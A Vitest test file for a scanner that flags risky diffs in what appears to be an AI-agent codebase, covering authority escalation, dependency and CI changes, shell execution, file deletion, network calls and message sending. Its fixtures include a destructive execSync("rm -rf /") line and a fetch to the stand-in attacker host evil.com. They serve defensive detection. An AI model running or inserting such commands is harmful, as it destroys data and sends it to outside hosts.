import { describe, expect, it } from "vitest";
import { scanPermissionDiff, permissionScanPasses } from "../src/engineering/permissionScan.js";

const CLEAN_DIFF = `diff --git a/src/utils/greet.ts b/src/utils/greet.ts
index 111..222 100644
--- a/src/utils/greet.ts
+++ b/src/utils/greet.ts
@@ -1,3 +1,4 @@
 export function greet(name: string) {
+  return \`Hello, \${name}\`;
 }
`;

describe("permissionScan", () => {
  it("clean-diff negative — no false positives", () => {
    expect(permissionScanPasses(CLEAN_DIFF)).toBe(true);
    expect(scanPermissionDiff(CLEAN_DIFF)).toHaveLength(0);
  });

  it("flags dangerous tool additions", () => {
    const diff = `diff --git a/src/engineering/approvalGate.ts b/src/engineering/approvalGate.ts
--- a/src/engineering/approvalGate.ts
+++ b/src/engineering/approvalGate.ts
@@ -1,3 +1,4 @@
+  "promote",
`;
    const findings = scanPermissionDiff(diff);
    expect(findings.some((f) => f.rule === "dangerous-tool")).toBe(true);
  });

  it("flags authority escalation", () => {
    const diff = `diff --git a/src/mastra/agentRegistry.ts b/src/mastra/agentRegistry.ts
--- a/src/mastra/agentRegistry.ts
+++ b/src/mastra/agentRegistry.ts
@@ -1,3 +1,4 @@
+    authority: "management",
`;
    expect(scanPermissionDiff(diff).some((f) => f.rule === "authority-escalation")).toBe(true);
  });

  it("flags dependency changes", () => {
    const diff = `diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -1,3 +1,4 @@
+  "dependencies": { "left-pad": "1.0.0" }
`;
    expect(scanPermissionDiff(diff).some((f) => f.rule === "dependency-change")).toBe(true);
  });

  it("flags security rails", () => {
    const diff = `diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -1,3 +1,4 @@
+  - run: npm test
`;
    expect(scanPermissionDiff(diff).some((f) => f.rule === "security-rails")).toBe(true);
  });

  it("flags shell exec patterns", () => {
    const diff = `diff --git a/src/foo.ts b/src/foo.ts
--- a/src/foo.ts
+++ b/src/foo.ts
@@ -1,3 +1,4 @@
+execSync("rm -rf /");
`;
    expect(scanPermissionDiff(diff).some((f) => f.rule === "shell-exec")).toBe(true);
  });

  it("flags file deletion patterns", () => {
    const diff = `diff --git a/src/foo.ts b/src/foo.ts
--- a/src/foo.ts
+++ b/src/foo.ts
@@ -1,3 +1,4 @@
+unlinkSync(path);
`;
    expect(scanPermissionDiff(diff).some((f) => f.rule === "file-deletion")).toBe(true);
  });

  it("flags network/external write patterns", () => {
    const diff = `diff --git a/src/foo.ts b/src/foo.ts
--- a/src/foo.ts
+++ b/src/foo.ts
@@ -1,3 +1,4 @@
+await fetch("https://evil.com");
`;
    expect(scanPermissionDiff(diff).some((f) => f.rule === "network-external-write")).toBe(true);
  });

  it("flags message-sending patterns", () => {
    const diff = `diff --git a/src/foo.ts b/src/foo.ts
--- a/src/foo.ts
+++ b/src/foo.ts
@@ -1,3 +1,4 @@
+await postMessage(webhookUrl, body);
`;
    expect(scanPermissionDiff(diff).some((f) => f.rule === "message-sending")).toBe(true);
  });
});
